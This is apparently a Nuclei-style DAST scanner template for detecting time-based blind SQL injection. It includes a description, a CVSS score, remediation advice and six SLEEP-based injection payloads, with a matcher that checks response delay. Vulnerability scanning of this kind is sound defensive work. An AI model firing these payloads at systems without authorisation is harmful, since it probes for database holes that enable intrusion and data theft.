id: {{.Name}}

info:
  name: Time-Based Blind SQL Injection
  author: wahyuhadi
  severity: critical
  description: |
    Time-Based SQL Injection is a type of Blind SQL Injection attack where an attacker determines database vulnerabilities by sending queries that force the database to delay its response. 
    If the response time changes, the attacker can infer whether the injected SQL query was successfully executed, even though there is no direct output from the database.
  metadata:
    severtity: high (7.5)
    cvss-3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-3.1-link: https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    max-request: 3
    tech: sql
  tags: time-based-sqli,sqli,dast,blind

  fixing: |
      - Prepared statements ensure that user input is treated as data, not executable SQL code. This completely prevents SQL injection.
      - Stored procedures execute SQL commands safely within the database, reducing the risk of injection when properly implemented.
      - Never display database error messages to users.
      - Ensure that the database user only has necessary privileges (e.g., no DROP, ALTER, EXECUTE permissions for web users).
  

flow: http(1) && http(2)

requests:
  - raw:
      - |
        {{ .Raw }}

    payloads:
      path:
        - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
        - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
        - "'+AND+(SELECT+4800+FROM+(SELECT(SLEEP(7)))HoBG)--"
        - "if(now()=sysdate(),SLEEP(7),0)"
        - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
        - "'XOR(SELECT+CASE+WHEN(1234=1234)+THEN+SLEEP(7)+ELSE+0+END)XOR'Z"

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - "duration>=7 && duration <=16"
# digest: 4a0a0047304502202529d892c477e15738b4e5537c797e61478cb79afff398f2dc90fca1769751960221009f10ae4d72053768a125dfa0aa2497b24e5150a453c8536c0cea34d4e5d4a5ae:922c64590222798bb761d5b6d8e72950